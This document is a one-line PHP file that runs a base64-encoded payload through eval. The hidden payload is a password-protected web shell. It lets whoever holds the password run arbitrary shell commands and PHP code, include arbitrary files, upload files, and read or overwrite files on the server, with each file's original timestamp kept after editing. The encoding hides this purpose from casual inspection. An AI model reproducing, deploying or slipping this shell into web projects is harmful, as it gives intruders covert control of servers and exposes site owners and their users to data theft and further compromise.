<?php eval(base64_decode('QHNldF90aW1lX2xpbWl0KDApOwogIEBlcnJvcl9yZXBvcnRpbmcoMik7CiAgQHNldF9tYWdpY19xdW90ZXNfcnVudGltZSgwKTsKICBAaW5pX3NldCgndXBsb2FkX21heF9maWxlc2l6ZScsMTA0ODU3NjApOwogIEBpbmlfc2V0KCdwb3N0X21heF9zaXplJywxMDQ4NTc2MCk7CiAgQGluaV9zZXQoJ2ZpbGVfdXBsb2FkcycsIHRydWUpOwogIEBpbmlfc2V0KCdkaXNwbGF5X2Vycm9ycycsdHJ1ZSk7CiAgQGluaV9zZXQoJ3JlZ2lzdGVyX2dsb2JhbHMnLHRydWUpOwogIEBpbmlfc2V0KCdyZWdpc3Rlcl9sb25nX2FycmF5cycsdHJ1ZSk7CiAgQGluaV9zZXQoJ21heF9leGVjdXRpb25fdGltZScsZmFsc2UpOwogIEBpbmlfc2V0KCdvdXRwdXRfYnVmZmVyaW5nJyxmYWxzZSk7CiAgQGluaV9zZXQoJ2FsbG93X3VybF9mb3BlbicsdHJ1ZSk7CiAgJHNhZmVtb2RlPUBpbmlfZ2V0KCdzYWZlX21vZGUnKTsKICAKICAkbWFnaWNfcXVvdGVzPTE7CiAgaWYgKGZ1bmN0aW9uX2V4aXN0cygnZ2V0X21hZ2ljX3F1b3Rlc19ncGMnKSkgJG1hZ2ljX3F1b3Rlcz1nZXRfbWFnaWNfcXVvdGVzX2dwYygpOwogIAogICRwaHB2ZXIgPSBzdHJfcmVwbGFjZSgnLicsJycscGhwdmVyc2lvbigpKTsKICBpZiAoc3RybGVuKCRwaHB2ZXIpPDMpIHdoaWxlIChzdHJsZW4oJHBocHZlcik8MykgJHBocHZlci49JzAnOwogIGlmKGludHZhbCgkcGhwdmVyKSA8IDQxMCl7CiAgICAkX1BPU1Q9JiRIVFRQX1BPU1RfVkFSUzsKICAgICRfR0VUPSYkSFRUUF9HRVRfVkFSUzsKICAgICRfU0VSVkVSPSYkSFRUUF9TRVJWRVJfVkFSUzsKICAgICRfQ09PS0lFPSYkSFRUUF9DT09LSUVfVkFSUzsKICAgICRfRklMRVM9JiRIVFRQX1BPU1RfRklMRVM7CiAgfQogIEBvYl9lbmRfY2xlYW4oKTsKCiAgJHB3X3Bscz0iPGZvcm0gbWV0aG9kPXBvc3Q+PGlucHV0IHR5cGU9dGV4dCBuYW1lPXB3PjwvZm9ybT4iOwogIAogIGlmIChlbXB0eSgkX1BPU1RbJ3B3J10pKSBleGl0KCRwd19wbHMpOwogIGlmICghZW1wdHkoJF9QT1NUWydwdyddKSAmJiBtZDUoJF9QT1NUWydwdyddKSE9JzYyZWY4OTFlYjJjNTJhYjg0ZjA2Yjg2OGNiNGNkNzMzJykgZXhpdCgkcHdfcGxzKTsKICAKICAkcHc9IjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPXB3IHZhbHVlPSciLmh0bWxzcGVjaWFsY2hhcnMoJF9QT1NUWydwdyddKS4iJz4iOwoKICBpZiAoIWVtcHR5KCRfUE9TVFsndXNlbW9kdWxlJ10pKSBpbmNsdWRlKCRfUE9TVFsndXNlbW9kdWxlJ10pOwogIAogICR3b3JrX2RpciA9IGdldGN3ZCgpOwogIGlmIChzdHJwb3MoJHdvcmtfZGlyLCJcXCIpIT09ZmFsc2UpICR3b3JrX2Rpcj1zdHJfcmVwbGFjZSgiXFwiLCIvIiwkd29ya19kaXIpOwogIGlmIChzdHJwb3Moc3Vic3RyKCR3b3JrX2RpciwwLDUpLCI6IikhPT1mYWxzZSkgJG9zPSJ3aW4iOwogIGVsc2UgJG9zPSJuaXgiOwogIGlmICghZW1wdHkoJF9QT1NUWydjZCddKSkgJGNkPXN0cmlwc2xhc2hlcygkX1BPU1RbJ2NkJ10pOwogIGVsc2UgJGNkID0gJHdvcmtfZGlyOwogIAogIGlmIChpc19kaXIoJGNkKSkgY2hkaXIoJGNkKTsKICAKICAkcnVuPXN0cmlwc2xhc2hlcygkX1BPU1RbJ3J1biddKTsKICAkZWRpdD1zdHJpcHNsYXNoZXMoJF9QT1NUWydlZGl0J10pOwogIGlmICghQGlzX2ZpbGUoJGVkaXQpKSAkZWRpdD0kY2Q7CiAgCiAgaWYgKCFlbXB0eSgkX1BPU1RbJ2V2YWwnXSkpIGV2YWwoKCRtYWdpY19xdW90ZXMpP3N0cmlwc2xhc2hlcygkX1BPU1RbJ2V2YWwnXSk6JF9QT1NUWydldmFsJ10pOwogIAogIGlmICghZW1wdHkoJF9GSUxFU1sndXNlcmZpbGUnXVsndG1wX25hbWUnXSkgJiYgaXNfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWyd1c2VyZmlsZSddWyd0bXBfbmFtZSddKSkgewogICAgJHVwbG9hZGRpciA9IGVyZWdfcmVwbGFjZSgnLysnLCAnLycsICRjZC4iLyIpOwogICAgJHVwbG9hZGZpbGUgPSAkdXBsb2FkZGlyLmJhc2VuYW1lKCRfRklMRVNbJ3VzZXJmaWxlJ11bJ25hbWUnXSk7CiAgICBtb3ZlX3VwbG9hZGVkX2ZpbGUoJF9GSUxFU1sndXNlcmZpbGUnXVsndG1wX25hbWUnXSwgJHVwbG9hZGZpbGUpOwogIH0KICAKICBpZiAoaXNzZXQoJF9QT1NUWydzYXZlJ10pKSB7CglpZiAoJG1hZ2ljX3F1b3RlcykgJGNvbnNvbGUgPSBzdHJpcHNsYXNoZXMoJF9QT1NUWydjb25zb2xlJ10pOwoJZWxzZSAkY29uc29sZSA9ICRfUE9TVFsnY29uc29sZSddOwogICAgJHRpbWUgPSBmaWxlbXRpbWUoJGVkaXQpOwogICAgJGY9QGZvcGVuKCRlZGl0LCJ3Iik7CiAgICBpZiAoJGYpIHsKICAgICAgZndyaXRlKCRmLCRjb25zb2xlKTsKICAgICAgZmNsb3NlKCRmKTsKICAgICAgdG91Y2goJGVkaXQsJHRpbWUpOwogICAgICAkZWRpdD0kY2Q7CiAgICB9CiAgfQogIAogIGlmICghZW1wdHkoJGVkaXQpICYmIGZpbGVfZXhpc3RzKCRlZGl0KSAmJiBpc19maWxlKCRlZGl0KSAmJiAkZWRpdCE9PSRjZCkgewoJaWYgKCRvcz09J3dpbic/Y2FuX3dyaXRlKCRlZGl0KTppc193cml0YWJsZSgkZWRpdCkpICRuZWVkX3NhdmVfYnV0dG9uPXRydWU7CiAgICAkZj1AZm9wZW4oJGVkaXQsInIiKTsKICAgIGlmICgkZikgewogICAgICBpZiAoZmlsZXNpemUoJGVkaXQpPjApICRyZXR2YWwgPSBAZnJlYWQoJGYsZmlsZXNpemUoJGVkaXQpKTsKICAgICAgZWxzZSAkcmV0dmFsID0gIltlbXB0eV0iOwogICAgICBmY2xvc2UoJGYpOwogICAgfSBlbHNlIHsKICAgICAgJHJldHZhbCA9ICJDYW4ndCBvcGVuIGZpbGU6ICRlZGl0XG4iOwogICAgfQogIH0gZWxzZWlmICghZW1wdHkoJHJ1bikpIHsKICAgICRjbWQgPSBlc2NhcGVzaGVsbGNtZCgkcnVuKTsKICAgICRyZXR2YWwgPSBtYWdpY19leGVjdXRlKCRjbWQpOwoKICB9IGVsc2VpZiAoZmlsZV9leGlzdHMoJGNkKSAmJiBAaXNfZGlyKCRjZCkpIHsKICAKCWlmICghJHNhZmVtb2RlKSAKCXsKCQlpZiAoJG9zPT0nd2luJykgCgkJewoJCSAgCgkJICAkY21kID0gImRpciAiLnN0cl9yZXBsYWNlKCIvIiwiXFwiLCRjZCk7CgkJICAkcmV0dmFsID0gbWFnaWNfZXhlY3V0ZSgkY21kKTsKCQl9CgkgICAgZWxzZSAKCQl7CgkJICAkY21kID0gImxzIC1sYSBcIiRjZFwiIjsKCQkgICRyZXR2YWwgPSBtYWdpY19leGVjdXRlKCRjbWQpOwoJCX0KCX0KICAKICAgIGlmIChlbXB0eSgkcmV0dmFsKSkKCXsKCQkkZGlyPSRjZDsKCQlpZigkY3VyZGlyID0gQG9wZW5kaXIoJGRpcikpIHsKCQl3aGlsZSgkZmlsZSA9IHJlYWRkaXIoJGN1cmRpcikpIHsKCQkgIGlmKCRmaWxlICE9ICcuJyAmJiAkZmlsZSAhPSAnLi4nKSB7CgkJCSRzcmNmaWxlID0gJGRpciAuICcvJyAuICRmaWxlOwoJCQlpZihpc19maWxlKCRzcmNmaWxlKSkgewoJCQkJaWYgKCRvcz09J3dpbic/Y2FuX3dyaXRlKCRzcmNmaWxlKTppc193cml0YWJsZSgkc3JjZmlsZSkpICRyZXR2YWwgLj0gIisrICIuJGZpbGUuIlxuIjsKCQkJCWVsc2UgJHJldHZhbCAuPSAiLS0gIi4kZmlsZS4iXG4iOwoJCQl9IGVsc2VpZihpc19kaXIoJHNyY2ZpbGUpKSB7CgkJCQlpZiAoJG9zPT0nd2luJz9jYW5fd3JpdGUoJHNyY2ZpbGUpOmlzX3dyaXRhYmxlKCRzcmNmaWxlKSkgJHJldHZhbCAuPSAiZCsgIi4kZmlsZS4iXG4iOwoJCQkJZWxzZSAkcmV0dmFsIC49ICJkLSAiLiRmaWxlLiJcbiI7CgkJCX0KCQkgIH0KCQl9CgkJY2xvc2VkaXIoJGN1cmRpcik7CgkJfSBlbHNlICRyZXR2YWwgPSAiQ2FudCBvcGVuIGRpcmVjdG9yeVxuIjsKCX0KICAgIAogICAgICAKICB9CiAgCgkkaWRfZXhlYyA9ICJjYW50IGdldCB1aWQsZ2lkIjsKICAKCWlmICgkdG1wID0gbWFnaWNfZXhlY3V0ZSgiaWQiKSkgJGlkX2V4ZWMgPSAkdG1wOwoJZWxzZWlmIChmdW5jdGlvbl9leGlzdHMoJ3Bvc2l4X2dldGdpZCcpKQoJewoJCSR1aWRzICA9IEBwb3NpeF9nZXRsb2dpbigpOwoJCSRldWlkcyA9IEBwb3NpeF9nZXRsb2dpbigpOwoJCSR1aWQgICA9IEBwb3NpeF9nZXR1aWQoKTsKCQkkZXVpZCAgPSBAcG9zaXhfZ2V0ZXVpZCgpOwoJCSRnaWQgICA9IEBwb3NpeF9nZXRnaWQoKTsKCQlpZiAoIWVtcHR5KCR1aWQpKSAkaWRfZXhlYyA9ICJVc2VyOiB1aWQ9JHVpZHMoJHVpZCkgZXVpZD0kZXVpZCgkZXVpZCkgZ2lkPSRnaWQoJGdpZCkiOwoJfSAgCiAgCiAgZWNobyAnPEhUTUw+PEJPRFkgb25sb2FkPSJkb2N1bWVudC5nZXRFbGVtZW50QnlJZChcJ2NkZm9jdXNcJykuZm9jdXMoKTsiPjxIUj4nOwogIGVjaG8gZGF0ZSgiZC5tLlkgaDppIEEiKS4iIE9TOiRvcyAkaWRfZXhlYyBzYWZlX21vZGU9JHNhZmVtb2RlIjsKICBlY2hvICI8SFI+IjsKICBpZiAoaXNzZXQoJG5lZWRfc2F2ZV9idXR0b24pKSBlY2hvICI8Rk9STSBtZXRob2Q9cG9zdD4iOwogIGVjaG8gJzxURVhUQVJFQSBpZD0iY29uc29sZSIgbmFtZT0iY29uc29sZSIgc3R5bGU9IndpZHRoOjEwMCU7aGVpZ2h0OjQwMHB4OyI+JzsKICBpZiAoaXNzZXQoJHJldHZhbCkpIGVjaG8gaHRtbHNwZWNpYWxjaGFycygkcmV0dmFsKTsKICBlY2hvICc8L1RFWFRBUkVBPic7CiAgaWYgKGlzc2V0KCRuZWVkX3NhdmVfYnV0dG9uKSkgZWNobyAiJHB3PElOUFVUIHR5cGU9J2hpZGRlbicgbmFtZT0nY2QnIHZhbHVlPSciLmh0bWxzcGVjaWFsY2hhcnMoJGNkKS4iJz48SU5QVVQgdHlwZT0naGlkZGVuJyBuYW1lPSdlZGl0JyB2YWx1ZT0nIi5odG1sc3BlY2lhbGNoYXJzKCRlZGl0KS4iJz48SU5QVVQgdHlwZT1zdWJtaXQgbmFtZT1zYXZlIHZhbHVlPSdTYXZlJz48L0ZPUk0+IjsKICBlY2hvICI8SFI+PEZPUk0gbWV0aG9kPVwiUE9TVFwiPiRwdyI7CiAgZWNobyAiPHRhYmxlPjx0cj48dGQ+ZGlyOjwvdGQ+PHRkIHdpZHRoPVwiMTAwJVwiPjxpbnB1dCB0eXBlPVwidGV4dFwiIHN0eWxlPVwid2lkdGg6MTAwJTtcIiBpZD1cImNkZm9jdXNcIiBuYW1lPVwiY2RcIiB2YWx1ZT1cIiIuaHRtbHNwZWNpYWxjaGFycygkY2QpLiJcIj48L3RkPjwvdHI+Ii4KICAgICAgICI8dHI+PHRkPnJ1bjo8L3RkPjx0ZD48aW5wdXQgdHlwZT1cInRleHRcIiBzdHlsZT1cIndpZHRoOjEwMCU7XCIgbmFtZT1cInJ1blwiIHZhbHVlPVwiXCI+PC90ZD48L3RyPiIuCiAgICAgICAiPHRyPjx0ZD5lZGl0OjwvdGQ+PHRkPjxpbnB1dCB0eXBlPVwidGV4dFwiIHN0eWxlPVwid2lkdGg6MTAwJTtcIiBuYW1lPVwiZWRpdFwiIHZhbHVlPVwiIi5odG1sc3BlY2lhbGNoYXJzKCRlZGl0KS4iXCI+PC90ZD48L3RyPiIuCiAgICAgICAiPC90YWJsZT4iLgogICAgICAgIjxpbnB1dCB0eXBlPVwic3VibWl0XCIgdmFsdWU9XCJPS1wiPjwvRk9STT4iOwogICAgICAKICBlY2hvICI8aHI+PGZvcm0gZW5jdHlwZT1cIm11bHRpcGFydC9mb3JtLWRhdGFcIiBtZXRob2Q9XCJwb3N0XCI+JHB3PElOUFVUIHR5cGU9J2hpZGRlbicgbmFtZT0nY2QnIHZhbHVlPSciLmh0bWxzcGVjaWFsY2hhcnMoJGNkKS4iJz48aW5wdXQgdHlwZT1cImhpZGRlblwiIG5hbWU9XCJNQVhfRklMRV9TSVpFXCIgdmFsdWU9XCIxNTAwMDAwMFwiIC8+dXBsb2FkOiA8aW5wdXQgbmFtZT1cInVzZXJmaWxlXCIgdHlwZT1cImZpbGVcIiAvPjxpbnB1dCB0eXBlPVwic3VibWl0XCIgdmFsdWU9XCJ1cGxvYWRcIiAvPjwvZm9ybT48aHI+IjsKICBlY2hvICI8Zm9ybSBtZXRob2Q9cG9zdD4kcHc8dGV4dGFyZWEgc3R5bGU9XCJ3aWR0aDoxMDAlO2hlaWdodDoxMDBweDtcIiAgbmFtZT0nZXZhbCcgaWQ9J2V2YWwnPnBocGluZm8oKTs8L3RleHRhcmVhPjxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0nRXZhbFBIUCc+PC9mb3JtPjxocj4iOwogIGVjaG8gInVzZSBtb2R1bGU6IDxmb3JtIG1ldGhvZD1wb3N0PiRwdzxpbnB1dCB0eXBlPSd0ZXh0JyBuYW1lPSd1c2Vtb2R1bGUnPiZuYnNwOzxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0ndXNlJz48L2Zvcm0+PGhyPiI7CiAgZWNobyAiPC9CT0RZPjwvSFRNTD4iOwogIAogIGV4aXQoKTsKICAKICAKICBmdW5jdGlvbiBjYW5fd3JpdGUoJGZpbGUpIHtpZihmaWxlX2V4aXN0cygkZmlsZSkpe2lmIChpc19maWxlKCRmaWxlKSkgeyRmPUBmb3BlbigkZmlsZSwiYSsiKTtpZigkZil7ZmNsb3NlKCRmKTtyZXR1cm4gdHJ1ZTt9fWVsc2VpZiAoaXNfZGlyKCRmaWxlKSkge2lmICgkZmlsZVtzdHJsZW4oJGZpbGUpLTFdIT0nLycpICRmaWxlLj0nLyc7JHRmaWxlID0gJGZpbGUuInRlc3R4eHh0ZXN0IjtpZiAoQHRvdWNoKCR0ZmlsZSkpe3VubGluaygkdGZpbGUpO3JldHVybiB0cnVlO319fXJldHVybiBmYWxzZTt9CgkKCWZ1bmN0aW9uIG1hZ2ljX2V4ZWN1dGUoJGNtZCkKCXsKCQkkcmVzPWZhbHNlOwoJCWlmIChmdW5jdGlvbl9leGlzdHMoJ2V4ZWMnKSkKCQl7CgkJCUBleGVjKCRjbWQsJHJlcyk7CgkJCSRyZXMgPSBqb2luKCJcbiIsJHJlcyk7CgkJfQoJCWVsc2UKCQlpZiAoZnVuY3Rpb25fZXhpc3RzKCdzaGVsbF9leGVjJykpCgkJCSRyZXMgPSBAc2hlbGxfZXhlYygkY21kKTsKCQllbHNlCgkJaWYgKGZ1bmN0aW9uX2V4aXN0cygnc3lzdGVtJykpCgkJewoJCQlAb2Jfc3RhcnQoKTsKCQkJQHN5c3RlbSgkY21kKTsKCQkJJHJlcyA9IEBvYl9nZXRfY29udGVudHMoKTsKCQkJQG9iX2VuZF9jbGVhbigpOwoJCX0KCQllbHNlCgkJaWYoZnVuY3Rpb25fZXhpc3RzKCdwYXNzdGhydScpKQoJCXsKCQkJQG9iX3N0YXJ0KCk7CgkJCUBwYXNzdGhydSgkY21kKTsKCQkJJHJlcyA9IEBvYl9nZXRfY29udGVudHMoKTsKCQkJQG9iX2VuZF9jbGVhbigpOwoJCX0KCQllbHNlCgkJaWYgKEBpc19yZXNvdXJjZSgkZiA9IEBwb3BlbigkY21kLCJyIikpKQoJCXsKCQkJJHJlcyA9ICIiOwoJCQl3aGlsZSghQGZlb2YoJGYpKSB7ICRyZXMgLj0gQGZyZWFkKCRmLDEwMjQpOyB9CgkJCUBwY2xvc2UoJGYpOwoJCX0KCQlyZXR1cm4gJHJlczsKCX0=')); ?>